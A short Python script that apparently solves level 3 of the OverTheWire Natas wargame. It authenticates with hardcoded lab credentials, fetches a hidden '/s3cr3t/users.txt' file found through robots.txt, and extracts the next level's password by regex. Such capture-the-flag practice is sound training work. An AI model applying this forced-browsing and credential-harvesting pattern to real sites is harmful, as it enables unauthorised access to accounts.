#!/usr/bin/python3

import requests
import re

username = 'natas3'
password = 'sJIJNW6ucpu6HPZ1ZAchaDtwd7oGrD14'

url = 'http://%s.natas.labs.overthewire.org' % username

# response = requests.get(url+'/robots.txt', auth = (username, password))
response = requests.get(url+'/s3cr3t/users.txt', auth = (username, password))
content = response.text
# print(content)

pwd = re.findall('natas4:(.*)', content)[0]
print(pwd)

